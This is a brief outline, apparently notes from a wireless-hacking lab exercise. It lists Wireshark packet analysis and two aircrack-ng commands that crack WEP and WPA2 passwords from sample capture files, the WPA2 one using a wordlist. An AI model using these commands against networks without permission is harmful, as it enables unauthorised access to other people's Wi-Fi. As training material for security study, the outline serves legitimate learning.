# Hacking Wireless Network

## Perform wireless traffic analysis

- Wi-Fi packet analysis using Wireshark

## Perform wireless attacks

- Crack a WEP network using Aircrack-ng
aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'

- Crack a WPA2 network using Aircrack-ng
aircrack-ng -a2 -b [Target BSSID] -w/home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
